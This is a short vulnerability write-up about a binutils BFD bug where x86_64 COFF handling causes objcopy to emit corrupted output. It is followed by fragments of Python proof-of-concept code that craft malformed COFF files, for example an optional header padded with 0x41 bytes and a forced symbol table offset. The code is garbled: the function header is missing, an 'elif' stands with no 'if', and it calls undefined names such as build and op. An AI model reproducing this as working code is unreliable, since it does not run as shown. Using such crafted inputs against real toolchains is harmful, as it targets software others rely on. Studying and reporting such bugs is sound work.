A vulnerability exists in coff-x86_64.c due to the inclusion of coff/pe.h, which causes code from coffcode.h to be broken for x86_64_coff_vec. The function bfd_coff_aoutsz must match coff_swap_aouthdr_out; otherwise, garbage data is written. Although support for --target=x86_64-coff has been removed, coff-x86_64.o is still produced with --enable-targets=all, allowing objcopy to recognize x86_64 COFF files but resulting in garbage output. This issue is related to the handling of PEAOUTHDR and AOUTHDR structures, and the vulnerability allows the creation of corrupted output files.

    """Return bytes of an x86_64 COFF (coff-x86-64) file."""
    f_magic  = 0x8664
    f_nscns  = len(nscns_sections)
    f_timdat = 0
    f_nsyms  = len(symtab_entries)
    f_flags  = 0x0002            # F_EXEC -> EXEC_P (+D_PAGED)
    f_opthdr = len(opthdr)

    hdr_size = 20 + f_opthdr
    scn_table_off = hdr_size
    # lay out section contents linearly after section headers
    content_off = scn_table_off + 40 * f_nscns
    scn_bytes = b""
    body = b""
    for (name, content, sflags, relptr_dummy) in nscns_sections:
        name8 = name.encode().ljust(8, b"\0")[:8]
        scnptr = content_off if len(content) > 0 else 0
        scn_bytes += struct.pack("<8sIIIIIIHHI", name8, 0, 0, len(content),
                                 scnptr, 0, 0, 0, 0, sflags)
        body += content
        content_off += len(content)
    symptr = symptr_adjust if f_nsyms else 0

    filehdr = struct.pack("<HHIIIHH", f_magic, f_nscns, f_timdat, symptr,
                          f_nsyms, f_opthdr, f_flags)
    return filehdr + opthdr + scn_bytes + body + b"".join(symtab_entries)

def opthdr_fill(size=240, magic=0x20b, fill=0x41):
    if size == 0: return b""
    b = bytearray([fill]*size)
    struct.pack_into("<H", b, 0, magic)
    return bytes(b)

def sym_entry(name=b"_text", value=0, scnum=1, typ=0x20, sclass=2, naux=0):
    n8 = name.ljust(8, b"\0")[:8]
    return struct.pack("<8sIIHBB", n8, value, scnum, typ, sclass, naux)

mk = lambda n,c,f: (n, c, f, None)

STYP_TEXT = 0x20
IMAGE_SCN_CNT_CODE = 0x20
IMAGE_SCN_MEM_EXECUTE = 0x20000000
IMAGE_SCN_MEM_READ = 0x40000000

base_sects = [ mk(".text", b"\x90"*16, IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_READ) ]

elif sys.argv[1] == "syms":

    syms = [ sym_entry() ]
    data = build(base_sects, op, syms)

    symoff = 20+240+40*1+16
    data = bytearray(data); struct.pack_into("<I", data, 8, symoff); data = bytes(data)
